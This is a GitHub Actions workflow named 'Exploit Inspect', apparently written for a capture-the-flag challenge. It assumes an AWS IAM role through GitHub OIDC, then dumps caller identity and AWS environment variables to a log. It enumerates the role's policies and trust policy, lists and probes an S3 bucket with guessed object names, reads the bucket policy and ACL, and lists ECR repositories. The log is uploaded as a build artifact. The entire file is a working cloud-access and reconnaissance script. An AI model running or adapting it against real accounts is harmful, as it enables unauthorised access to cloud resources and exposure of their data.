name: Exploit Inspect
on:
  push:
    branches: [ main ]

permissions:
  id-token: write
  contents: read

jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1
          role-session-name: ctf-inspect-session

      - name: Show assumed identity & env
        run: |
          set -eux
          echo "### ENV SUMMARY ###" > /tmp/inspect.log
          date >> /tmp/inspect.log
          echo "GITHUB_ACTOR=$GITHUB_ACTOR" >> /tmp/inspect.log
          echo "GITHUB_REF=$GITHUB_REF" >> /tmp/inspect.log
          echo "RUNNER_OS=$RUNNER_OS" >> /tmp/inspect.log
          echo "### STS GET-CALLER-IDENTITY ###" >> /tmp/inspect.log
          aws sts get-caller-identity 2>&1 | tee -a /tmp/inspect.log || true
          echo "### AWS ENV (masked) ###" >> /tmp/inspect.log
          env | grep -E 'AWS|AWS_' || true
          # Note: credentials are not printed, but presence of AWS_* envs helps
          echo "" >> /tmp/inspect.log
        shell: bash

      - name: Try to list inline role policies and attached policies
        run: |
          set -x
          echo "### IAM: list-role-policies ###" >> /tmp/inspect.log
          # try to get the role name from ARN (if sts returned it)
          ROLE="imaginary-challenge"
          aws iam list-role-policies --role-name "$ROLE" 2>&1 | tee -a /tmp/inspect.log || true
          echo "### IAM: list-attached-role-policies ###" >> /tmp/inspect.log
          aws iam list-attached-role-policies --role-name "$ROLE" 2>&1 | tee -a /tmp/inspect.log || true
          echo "### IAM: get-role (for trust policy) ###" >> /tmp/inspect.log
          aws iam get-role --role-name "$ROLE" 2>&1 | tee -a /tmp/inspect.log || true

      - name: Try S3 API (explicit HEAD + GetBucketPolicy)
        run: |
          set -x
          PREFIX="s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/"
          echo "### S3: attempt list (cli wrapper) ###" >> /tmp/inspect.log
          aws s3 ls "${PREFIX}" --recursive 2>&1 | tee -a /tmp/inspect.log || true

          # test a specific object HEAD to capture exact aws error (replace candidate name if needed)
          # This will show whether HeadObject returns 403 (AccessDenied) or 404 (NotFound) or auth error.
          CANDIDATES=("docker-image.tar" "image.tar" "challenge-image.tar" "image.tar.gz" "docker_image.tar")
          for o in "${CANDIDATES[@]}"; do
            echo "=== HEAD s3 object: ${o} ===" | tee -a /tmp/inspect.log
            aws s3api head-object --bucket challenge-assets-production-empasoft-ctf --key "forensic/imaginary-challenge/${o}" 2>&1 | tee -a /tmp/inspect.log || true
          done

          echo "### S3: get-bucket-policy ###" >> /tmp/inspect.log
          aws s3api get-bucket-policy --bucket challenge-assets-production-empasoft-ctf 2>&1 | tee -a /tmp/inspect.log || true

          echo "### S3: get-bucket-acl ###" >> /tmp/inspect.log
          aws s3api get-bucket-acl --bucket challenge-assets-production-empasoft-ctf 2>&1 | tee -a /tmp/inspect.log || true

      - name: Try ECR (just in case)
        run: |
          set -x
          echo "### ECR describe-repositories ###" >> /tmp/inspect.log
          aws ecr describe-repositories 2>&1 | tee -a /tmp/inspect.log || true

      - name: Upload inspect log
        uses: actions/upload-artifact@v4
        with:
          name: exploit-inspect-log
          path: /tmp/inspect.log
